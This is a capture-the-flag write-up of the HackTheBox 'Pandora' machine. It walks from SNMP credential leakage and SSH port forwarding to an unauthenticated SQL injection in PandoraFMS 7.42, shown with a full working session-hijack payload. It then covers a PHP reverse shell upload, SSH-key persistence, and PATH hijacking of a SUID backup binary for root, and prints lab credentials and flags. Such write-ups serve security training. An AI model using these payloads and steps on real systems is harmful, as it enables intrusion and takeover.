## Intro

tags: #linux #PortForwarding #SNMP #OSCPpath #LinPEAS  #unknown-binary #easy

-------
# Reconnaissance

```shell
source basher target1 10.129.53.239 [IP]
source basher host1 pandora.htb [host]

echo "$target1 $host1" | sudo tee -a /etc/hosts
```

## Port scan
### Identify open TCP ports fast
```shell
sudo nmap -p- --open -sS --min-rate 5000 -Pn -n $target1
```

```shell
Starting Nmap 7.98 ( https://nmap.org ) at 2026-08-09 11:18 -0400
Nmap scan report for 10.129.53.239
Host is up (0.33s latency).
Not shown: 52124 closed tcp ports (reset), 13409 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 21.85 seconds
```

### Targeted TCP scan

```shell
sudo nmap -p22,80 -A $target1
```

```shell
Starting Nmap 7.98 ( https://nmap.org ) at 2026-08-09 11:19 -0400
Nmap scan report for pandora.htb (10.129.53.239)
Host is up (0.047s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 24:c2:95:a5:c3:0b:3f:f3:17:3c:68:d7:af:2b:53:38 (RSA)
|   256 b1:41:77:99:46:9a:6c:5d:d2:98:2f:c0:32:9a:ce:03 (ECDSA)
|_  256 e7:36:43:3b:a9:47:8a:19:01:58:b2:bc:89:f6:51:08 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Play | Landing
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   46.76 ms 10.10.14.1
2   47.23 ms pandora.htb (10.129.53.239)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.97 seconds
```

### Identify open UDP ports

```shell
sudo nmap -p- --open -sU --min-rate 5000 -Pn -n $target1
```

```shell
Starting Nmap 7.98 ( https://nmap.org ) at 2026-08-09 11:20 -0400
Warning: 10.129.53.239 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.129.53.239
Host is up (0.070s latency).
Not shown: 65383 open|filtered udp ports (no-response), 151 closed udp ports (port-unreach)
PORT    STATE SERVICE
161/udp open  snmp

Nmap done: 1 IP address (1 host up) scanned in 145.60 seconds
```
snmp open, hmm interesting


----
# Foothold


## SNMP enumeration

```shell
snmpwalk -v 1 -c public pandora.htb
```
found this among the output
```shell
  -c sleep 30; /bin/bash -c '/usr/bin/host_check -u daniel -p HotelBabylon23'
```
#### creds obtained

```shell
daniel
HotelBabylon23
```

## Shell as daniel

got shell as daniel, the flag wasnt there, tried matt, found the flag file there but could not view it
```shell
└─$ ssh daniel@pandora.htb                                                           
The authenticity of host 'pandora.htb (10.129.53.239)' can't be established.
ED25519 key fingerprint is: SHA256:yDtxiXxKzUipXy+nLREcsfpv/fRomqveZjm6PXq9+BY
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'pandora.htb' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
daniel@pandora.htb's password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun  9 Aug 15:29:18 UTC 2026

  System load:           0.0
  Usage of /:            63.0% of 4.87GB
  Memory usage:          8%
  Swap usage:            0%
  Processes:             233
  Users logged in:       0
  IPv4 address for eth0: 10.129.53.239
  IPv6 address for eth0: dead:beef::a0de:adff:fe28:ca75

  => /boot is using 91.8% of 219MB


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

daniel@pandora:~$ ls
daniel@pandora:~$ ls -la
total 28
drwxr-xr-x 4 daniel daniel 4096 Aug  9 15:29 .
drwxr-xr-x 4 root   root   4096 Dec  7  2021 ..
lrwxrwxrwx 1 daniel daniel    9 Jun 11  2021 .bash_history -> /dev/null
-rw-r--r-- 1 daniel daniel  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 daniel daniel 3771 Feb 25  2020 .bashrc
drwx------ 2 daniel daniel 4096 Aug  9 15:29 .cache
-rw-r--r-- 1 daniel daniel  807 Feb 25  2020 .profile
drwx------ 2 daniel daniel 4096 Dec  7  2021 .ssh
daniel@pandora:~$ cat .bash_history 
daniel@pandora:~$ ls
daniel@pandora:~$ cd ..
daniel@pandora:/home$ ls
daniel  matt
daniel@pandora:/home$ cd matt
daniel@pandora:/home/matt$ ls
user.txt
daniel@pandora:/home/matt$ cat user.txt 
cat: user.txt: Permission denied
daniel@pandora:/home/matt$ ls -la
total 24
drwxr-xr-x 2 matt matt 4096 Dec  7  2021 .
drwxr-xr-x 4 root root 4096 Dec  7  2021 ..
lrwxrwxrwx 1 matt matt    9 Jun 11  2021 .bash_history -> /dev/null
-rw-r--r-- 1 matt matt  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 matt matt 3771 Feb 25  2020 .bashrc
-rw-r--r-- 1 matt matt  807 Feb 25  2020 .profile
-rw-r----- 1 root matt   33 Aug  9 15:15 user.txt
daniel@pandora:/home/matt$ 
```
we dont have enough permission to read user.txt

## Listening ports

```shell
Netid  State   Recv-Q  Send-Q     Local Address:Port     Peer Address:Port  Process  
udp    UNCONN  0       0          127.0.0.53%lo:53            0.0.0.0:*              
udp    UNCONN  0       0                0.0.0.0:68            0.0.0.0:*              
udp    UNCONN  0       0                0.0.0.0:161           0.0.0.0:*              
udp    UNCONN  0       0                  [::1]:161              [::]:*              
tcp    LISTEN  0       80             127.0.0.1:3306          0.0.0.0:*              
tcp    LISTEN  0       4096       127.0.0.53%lo:53            0.0.0.0:*              
tcp    LISTEN  0       128              0.0.0.0:22            0.0.0.0:*              
tcp    LISTEN  0       511                    *:80                  *:*              
tcp    LISTEN  0       128                 [::]:22               [::]:*   
```

## Filesystem enum

```shell
daniel@pandora:/etc/apache2/sites-enabled$ cat pandora.conf 
<VirtualHost localhost:80>
  ServerAdmin admin@panda.htb
  ServerName pandora.panda.htb
  DocumentRoot /var/www/pandora
  AssignUserID matt matt
  <Directory /var/www/pandora>
    AllowOverride All
  </Directory>
  ErrorLog /var/log/apache2/error.log
  CustomLog /var/log/apache2/access.log combined
</VirtualHost>
```

- This means that even if we add the vhost to out vhost file we won’t be able to access it as it is hosted internally.
- So for this we need to port forward our connection to remote host’s internal port which can be done with ssh using the following command

## Port forwarding 

forward internal port 80 to 9001
```shell
ssh -L 0.0.0.0:9001:127.0.0.1:80 daniel@pandora.htb
```
now navigate to the page
![](MediaFiles/Pasted%20image%2020260809183406.png)
version of pandoraFMS is `v7.0NG.742_FIX_PERL2020`
tried multiple combinations of daniel's pass with daniel and matt and also admin but no luck, so no password reuse

### Vulnerable webapp version

Lets search for exploits regarding this version
```shell
└─$ searchsploit pandorafms                                                          
--------------------------------------------------- ---------------------------------
 Exploit Title                                     |  Path
--------------------------------------------------- ---------------------------------
PANDORAFMS 7.0 - Authenticated Remote Code Executi | php/webapps/48064.py
PandoraFMS 7.0 NG 746 - Persistent Cross-Site Scri | php/webapps/48707.txt
PandoraFMS 7.0NG.772 - SQL Injection               | php/webapps/52157.py
PandoraFMS NG747 7.0 - 'filename' Persistent Cross | php/webapps/48700.txt
--------------------------------------------------- ---------------------------------
Shellcodes: No Results

```
we are not authenticated so cant use the first one, searched online too
https://www.sonarsource.com/blog/pandora-fms-742-critical-code-vulnerabilities-explained/?source=post_page-----ee1b3fa3e786---------------------------------------

lets navigate there
```shell
http://127.0.0.1:9001/pandora_console/include/chart_generator.php
```
![](MediaFiles/Pasted%20image%2020260809184205.png)
The session_id is where the sqli is which is unauthenticated, as given in the article:
```
http://127.0.0.1:9001/pandora_console/include/chart_generator.php?session_id=%27
```
![](MediaFiles/Pasted%20image%2020260809184313.png)
great! we got detailed error
```shell
SQL error
: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '''' LIMIT 1' at line 1 ('SELECT * FROM tsessions_php WHERE `id_session` = ''' LIMIT 1') in
/var/www/pandora/pandora_console/include/db/mysql.php
on line 114
```
thats vuln to UNION injection with the below it complains about the number of columns being wrong
```shell
http://127.0.0.1:9001/pandora_console/include/chart_generator.php?session_id=' union select 1;-- -
```

```shell
SQL error
: The used SELECT statements have a different number of columns ('SELECT * FROM tsessions_php WHERE `id_session` = '' union select 1;-- -' LIMIT 1') in
/var/www/pandora/pandora_console/include/db/mysql.php
on line 114
```
found this poc online
https://github.com/ibnuuby/CVE-2021-32099

```shell
http://localhost:9001/pandora_console/include/chart_generator.php?session_id=a%27%20UNION%20SELECT%20%27a%27,1,%27id_usuario|s:5:%22admin%22;%27%20as%20data%20FROM%20tsessions_php%20WHERE%20%271%27=%271
```
its a white screen, now go back to `http://localhost:9001/pandora_console/` and we are now logged in!

## Admin panel
![](MediaFiles/Pasted%20image%2020260809184806.png)

On Admin tools > Database interface i can execute queries

Also really interesting is the File manager also found on admin tools, where we can upload files too

But the easiest thing might be to just change the admin's pass on the top right and then use the authenticated rce exploit i found earlier
![](MediaFiles/Pasted%20image%2020260809185452.png)
great! lets now execute the previously found exploit tried it with the other exploit but did not work
### Upload php rev shell

lets do sth easier, go to file manager and upload the reverse php shell
then navigate to
`http://localhost:9001/pandora_console/images/php-reverse-shell.php`

## Shell as matt

and got rev shell!
```shell
└─$ nc -lvnp 4444                                                                    
listening on [any] 4444 ...
connect to [10.10.15.168] from (UNKNOWN) [10.129.53.239] 48740
Linux pandora 5.4.0-91-generic #102-Ubuntu SMP Fri Nov 5 16:31:28 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
 16:05:18 up 50 min,  1 user,  load average: 0.12, 0.07, 0.02
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
daniel   pts/0    10.10.15.168     15:33   31:44   0.02s  0.02s -bash
uid=1000(matt) gid=1000(matt) groups=1000(matt)
/bin/sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
matt@pandora:/$ whoami
whoami
matt
matt@pandora:/home$ cd matt
cd matt
matt@pandora:/home/matt$ ls
ls
user.txt
matt@pandora:/home/matt$ cat user.txt   
cat user.txt
ad6ea227bd5d048388ea0105f78c6cb5
```

## Persistence

lets get persistence by uploading our public key on target host

generated my public key:
```shell
└─$ ssh-keygen -t rsa -b 4096                                                                                                          
Generating public/private rsa key pair.
Enter file in which to save the key (/home/ch3ckm8/.ssh/id_rsa): 
Enter passphrase for "/home/ch3ckm8/.ssh/id_rsa" (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/ch3ckm8/.ssh/id_rsa
Your public key has been saved in /home/ch3ckm8/.ssh/id_rsa.pub
The key fingerprint is:
SHA256:p0TJLlobzvmztUFenZ6YcWv3kfyzemKcLEfS9e4MFto ch3ckm8@kali
The key's randomart image is:
+---[RSA 4096]----+
|                 |
|       . .       |
|        +        |
|       o     . o |
|      + S o + * .|
|     = * = o @.+o|
|    . = . + O E=.|
|       ... + X *=|
|        oo. +.+oB|
+----[SHA256]-----+

┌──(ch3ckm8㉿kali)-[~]
└─$ ls -la ~/.ssh/                                                                                                                     
total 36
drwx------  3 ch3ckm8 ch3ckm8 4096 Aug  9 12:10 .
drwxr-xr-x 34 ch3ckm8 ch3ckm8 4096 Aug  9 12:01 ..
drwx------  2 ch3ckm8 ch3ckm8 4096 May 31 07:23 agent
-rw-------  1 ch3ckm8 ch3ckm8 3381 Aug  9 12:10 id_rsa
-rw-r--r--  1 ch3ckm8 ch3ckm8  738 Aug  9 12:10 id_rsa.pub
-rw-------  1 ch3ckm8 ch3ckm8 7028 Aug  9 11:29 known_hosts
-rw-------  1 ch3ckm8 ch3ckm8 6806 Aug  9 11:29 known_hosts.old

┌──(ch3ckm8㉿kali)-[~]
└─$ cat ~/.ssh/id_rsa.pub                                                                                                              
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDL+BXosFiC5oUxnuDI8Y7ZaGCLlBCAjkxrJyk7dL9Xgs4mc938/KwaQwUdv+C6k+Ysed/NtVxy105hFaMiXEVDfvSgOyvePBuBVk2RZy2v4a2KRSpkMMxly/LEa2rT1B62WEodsUpMi7nacemMl9B/DDV0W0/zaUVf3Wq9abQur6hnlpk9jahKAH/9N+FL4pc7Fr5v1FpgtDCMGyY/T5c8utwJ4KKKBhTE96aOkpFOnIZWpeMP8a+FYZMHqzQ/S4Be/LVHY6D+7vpV4kB2Z6RO7j9yZgyLEd17CIYAodguSMkVLEE10yMGMSsqVRFJZE0KiC8ZpFdtwaoCwaLgr+8hvlm4Lp6A63uD+6JNgOBGHWF7nsPhLCC0/Dve81QgETIqUfyZ+BLc6wtIIRHgBFZbgKBsoLks3wJK675afFgvoMfMQDGnT9N63sjztn8c47Fil1IarkYPIgI2oBM+pfJPMY6CJAZ2VffkTmkUj3KE2w+xj/7XuOb1/+U+T2Q2wByU38m1wIWUWKBikeFZDYZ35DoMxHQ5xbGbxxyiK8KjKx5LUT6pIKXMNpa1VvfXGSIMBgSr+g9A/zGuKmKqWxDG4KSzN4z5K8/ITNS0SSHwqnG0ka78jdlLEYbxem7XHkC0UuImE80uF9Bw6g1xe6rszgV0PmdKCQugGYs8SvefPQ== ch3ckm8@kali

```
then on target:
```shell
mkdir -p ~/.ssh
chmod 700 ~/.ssh

matt@pandora:/home/matt/.ssh$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDL+BXosFiC5oUxnuDI8Y7ZaGCLlBCAjkxrJyk7dL9Xgs4mc938/KwaQwUdv+C6k+Ysed/NtVxy105hFaMiXEVDfvSgOyvePBuBVk2RZy2v4a2KRSpkMMxly/LEa2rT1B62WEodsUpMi7nacemMl9B/DDV0W0/zaUVf3Wq9abQur6hnlpk9jahKAH/9N+FL4pc7Fr5v1FpgtDCMGyY/T5c8utwJ4KKKBhTE96aOkpFOnIZWpeMP8a+FYZMHqzQ/S4Be/LVHY6D+7vpV4kB2Z6RO7j9yZgyLEd17CIYAodguSMkVLEE10yMGMSsqVRFJZE0KiC8ZpFdtwaoCwaLgr+8hvlm4Lp6A63uD+6JNgOBGHWF7nsPhLCC0/Dve81QgETIqUfyZ+BLc6wtIIRHgBFZbgKBsoLks3wJK675afFgvoMfMQDGnT9N63sjztn8c47Fil1IarkYPIgI2oBM+pfJPMY6CJAZ2VffkTmkUj3KE2w+xj/7XuOb1/+U+T2Q2wByU38m1wIWUWKBikeFZDYZ35DoMxHQ5xbGbxxyiK8KjKx5LUT6pIKXMNpa1VvfXGSIMBgSr+g9A/zGuKmKqWxDG4KSzN4z5K8/ITNS0SSHwqnG0ka78jdlLEYbxem7XHkC0UuImE80uF9Bw6g1xe6rszgV0PmdKCQugGYs8SvefPQ== ch3ckm8@kali" >> ~/.ssh/authorized_keys
<Ys8SvefPQ== ch3ckm8@kali" >> ~/.ssh/authorized_keys

chmod 600 ~/.ssh/authorized_keys
```
now just login via ssh and we are logged in as matt!

----
# Privesc

well , since we dont know matt's password, we cant run sudo -l:
```shell
matt@pandora:~$ sudo -l
[sudo] password for matt: 
Sorry, try again.
[sudo] password for matt: 
Sorry, try again.
[sudo] password for matt: 
sudo: 3 incorrect password attempts
```

## Filesystem enumeration

nothing too interesting found

## Linpeas

### Unknown SUID binary

via linpeas , found `/usr/bin/pandora_backup` and by running it it seems to perform some backup operation and its not a "native"/"known" suid

(this could be found  manually also)
```shell
find / -perm -u=s -type f 2>/dev/null
```

```shell
matt@pandora:/$ find / -perm -u=s -type f 2>/dev/null
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/pandora_backup
/usr/bin/passwd
/usr/bin/mount
/usr/bin/su
/usr/bin/at
/usr/bin/fusermount
/usr/bin/chsh
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
```

also this is a suid binary
```shell
matt@pandora:/$ ls -la /usr/bin/pandora_backup
-rwsr-x--- 1 root matt 16816 Dec  3  2021 /usr/bin/pandora_backup
```
**`pandora_backup`** has **executable** permission given to user **matt**. This binary can be used to escalate privilege by **`Path Hijacking`** **if the Linux commands used inside this binary is not used with their absolute path**. Lets  check whether any Linux command is being used without its absolute path inside **`pandora_backup`**.

lets inspect the binary
```shell
matt@pandora:/$ cat /usr/bin/pandora_backup
ELF>�@0:@8
          @@@@h���HHmm   HH�-�=�=hp�-�=�=����DDP�td� � � <<Q�tdR�td�-�=�=▒▒/lib64/ld-linux-x86-64.so.2GNUqtðG7�%H9�
                                                                                                                   ��f��Z�GNU
�
�e�m\ 4x � %"putssetreuidsystemgetuidgeteuid__cxa_finalize__libc_start_mainlibc.so.6GLIBC_2.2.5_ITM_deregisterTMCloneTable__gmon_start___ITM_registerTMCloneTableFu▒i  P�p�0HH@�?�?�?�?        �?
SH�=��&/�DH�=�/H��/H9�tH��.H��t/�����H�=Y/H�5R/H)�H��H��?H��H�H��tH��.H����fD���=/u/UH�=�.H��t^H��H���PTL��H�
                                                                                              H�=�.�-����h�����.]�����{���UH��SH��������������މ������H�=n�����H�=������H�=���������tH�=��d�����H�=��Q���H�=��E����H�]���f.�AWL�=�+AVI��AUI��ATA��UH�-�+SL)�H������H��t�L��L��D��A��H��H9�u�H�[]A\A]A^A_��H�H��PandoraFMS Backup UtilityNow attempting to backup PandoraFMS clienttar -cvf /root/.backup/pandora-backup.tar.gz /var/www/pandora/pandora_console/*Backup failed!
Check your permissions!Backup successful!Terminating program!<(�������������X}�������h���8zRx
                                                                                            8���+zRx
                                                                                                   $����`F▒J
E�w                                                                                                         �?▒;*3$"D���$\�����A�C
  D����]B�I▒�E �E(�D0�H8�G@j8A0A(B B▒B�(���p0F
d�▒����80
�
 ▒@x�   ▒������o����o���o����o�=6FVfvH@GCC: (Debian 10.2.1-6) 10.2.1 20210110��08�
�

��d � 8!�=�=�=�?@▒@@P@▒��
                         ��!07P@C�=jpv�=������D"����=��=��=�� �@�
                                                                 ` � ▒@@.?▒P@
                                                                             dFYl��▒@@� �▒H@� �]�X@��+��P@u�
                                                                                                            ▒P@▒ 2"crtstuff.cderegister_tm_clones__do_global_dtors_auxcompleted.0__do_global_dtors_aux_fini_array_entryframe_dummy__frame_dummy_init_array_entrybackup.c__FRAME_END____init_array_end_DYNAMIC__init_array_start__GNU_EH_FRAME_HDR_GLOBAL_OFFSET_TABLE___libc_csu_fini_ITM_deregisterTMCloneTableputs@GLIBC_2.2.5_edatagetuid@GLIBC_2.2.5system@GLIBC_2.2.5geteuid@GLIBC_2.2.5__libc_start_main@GLIBC_2.2.5__data_start__gmon_start____dso_handle_IO_stdin_used__libc_csu_initsetreuid@GLIBC_2.2.5__bss_startmain__TMC_END___ITM_registerTMCloneTable__cxa_finalize@GLIBC_2.2.5.symtab.strtab.shstrtab.interp.note.gnu.build-id.note.ABI-tag.gnu.hash.dynsym.dynstr.gnu.version.gnu.version_r.rela.dyn.rela.plt.init.plt.got.text.fini.rodata.eh_frame_hdr.eh_frame.init_array.fini_array.dynamic.got.plt.data.bss.comment�#��$6�� D��No
                                                                                                            ▒V88�^���o��k���o��z▒�B��▒��  `�����dd     �  �� � <�8!8������=�-��?��@�@@@P@P�0P0'x0`▒    �6M%9m
```
we see in the above snippet this thing
`tar -cvf /root/.backup/pandora-backup.tar.gz /var/www/pandora/pandora_console/`

 Running the actual `/usr/bin/pandora_backup` script appears to create a `tar` archive of the `/var/www/pandora/pandora_console/` directory.

## Shell as root

We found that **`$ tar`** command is used without its absolute path. We can use **`$ tar`** command to exploit this vulnerability and get root shell. When I tried to get shell by manipulating **`$ tar`** command I got root shell without much effort. So here our potential **`PrivEsc Vector`** is `**Privilege Escalation** by **Path Hijacking**` or `**Privilege Escalation** by **Custom SUID exploitation**`. 

Ok, the point that interests us is clearly visible, the backup is done by compressing the files with **tar**. Nothing could be easier, you need to create a custom **tar** file with anything you want inside, in this case i preferred shell, you copy the root flag in a reachable folder by matt. 

for leaking flag only:
```shell
cd /tmp
echo "cp --no-preserve=mode /root/root.txt /tmp/" > tar
export PATH=$(pwd):$PATH
chmod +x tar
/usr/bin/pandora_backup
```
for getting root shell:
```shell
cd /tmp
echo "/bin/bash" > tar
export PATH=$(pwd):$PATH
chmod +x tar
/usr/bin/pandora_backup
whoami && id
```

```shell
matt@pandora:/$ cd /tmp
matt@pandora:/tmp$ echo "/bin/bash" > tar
matt@pandora:/tmp$ export PATH=$(pwd):$PATH
matt@pandora:/tmp$ chmod +x tar
matt@pandora:/tmp$ /usr/bin/pandora_backup
PandoraFMS Backup Utility
Now attempting to backup PandoraFMS client
root@pandora:/tmp#
root@pandora:/tmp# whoami && id
root
uid=0(root) gid=1000(matt) groups=1000(matt)
root@pandora:~# cd /root
root@pandora:/root# ls
root.txt
root@pandora:/root# cat root.txt
e0bf6e632ed475808bce703d4293b04d
root@pandora:/root# 
```

----
# Summary




-----
# Sidenotes

